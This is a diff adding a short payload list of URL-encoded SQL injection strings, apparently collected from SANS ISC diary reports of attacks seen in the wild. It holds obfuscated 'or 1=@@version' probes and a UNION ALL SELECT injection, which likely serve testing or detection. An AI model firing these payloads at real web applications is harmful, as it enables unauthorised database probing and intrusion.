@@ -1,0 +1,8 @@
+# http://isc.sans.edu/diary.html?storyid=12127
+189%27%29%29%2F%2A%2A%2For%2F%2A%2A%2F1%3D%40%40version------snip----
+189%29%2F%2A%2A%2For%2F%2A%2A%2F1%3D%40%40version--------snip----
+189%2F%2A%2A%2For%2F%2A%2A%2F1%3D%40%40version%29%29------snip----
+189%27%2F%2A%2A%2For%2F%2A%2A%2F1%3D%40%40version%29------snip----
+
+# http://isc.sans.edu/diary.html?storyid=11011
+999999.9+UNION+ALL+SELECT+0x31303235343830303536%2C0x31303235343830303536--
